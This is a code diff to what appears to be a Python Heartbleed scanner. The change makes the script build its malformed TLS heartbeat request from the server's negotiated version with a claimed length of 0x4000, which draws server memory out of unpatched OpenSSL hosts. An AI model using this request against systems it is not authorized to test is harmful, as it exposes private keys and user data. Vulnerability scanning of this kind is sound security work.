@@ -111,15 +111,9 @@ c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
 00 0f 00 01 01
 ''')
 
-hb = h2bin(''' 
-18 03 02 00 03
-01 40 00
-''')
-
 def create_hb_req(version, length):
     return h2bin('18') + struct.pack('>H', version) + \
         h2bin('00 03 01') + struct.pack('>H', length)
-
 
 def hexdump(s):
     for b in xrange(0, len(s), 16):
@@ -162,7 +156,7 @@ def recvall(s, length, timeout=5):
             recv_buffer += data
     return rdata
 
-def hit_hb(s):
+def hit_hb(s, hb):
     s.send(hb)
     while True:
         typ, ver, pay, done = recv_sslrecord(s)
@@ -277,14 +271,14 @@ def is_vulnerable(domain, port, protocol):
         if typ == None:
             #print 'Server closed connection without sending Server Hello.'
             return None
+        version = ver
         # Look for server hello done message.
         if typ == 22 and done:
             break
 
     #print 'Sending heartbeat request...'
     #sys.stdout.flush()
-    s.send(hb)
-    return hit_hb(s)
+    return hit_hb(s, create_hb_req(version, 0x4000))
 
 
 def scan_address(domain, address, protocol, portlist):
